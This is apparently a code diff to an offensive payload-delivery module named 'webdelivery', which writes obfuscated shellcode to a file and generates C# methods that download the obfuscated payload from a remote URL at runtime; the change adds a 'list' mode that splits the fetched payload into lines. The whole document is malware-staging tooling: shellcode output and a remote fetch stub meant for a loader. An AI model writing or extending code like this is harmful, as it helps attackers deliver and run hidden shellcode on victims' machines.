@@ -1,5 +1,6 @@
 import random
 import string
+import json
 from utils.utils import *
 
 class webdelivery:
@@ -15,6 +16,8 @@ class webdelivery:
             open(outfile, 'wb').write(shellcode)
         elif self.type == 'str':
             open(outfile, 'w').write(shellcode)
+        elif self.type == 'list':
+            open(outfile, 'w').write('\n'.join(shellcode))
         print(f'Writing obfuscated shellcode to {outfile}')
         if 'url' in arguments:
             self.url = arguments['url']
@@ -41,6 +44,14 @@ class webdelivery:
             public static String {self.name}()
             {{
                 var obfuscated = (new WebClient()).DownloadString("{self.url}");
+                return obfuscated;
+            }}
+"""
+        elif self.type == 'list':
+            return f"""
+            public static String[] {self.name}()
+            {{
+                var obfuscated = (new WebClient()).DownloadString("{self.url}").Split(new char[] {{ '\\n' }});
                 return obfuscated;
             }}
 """
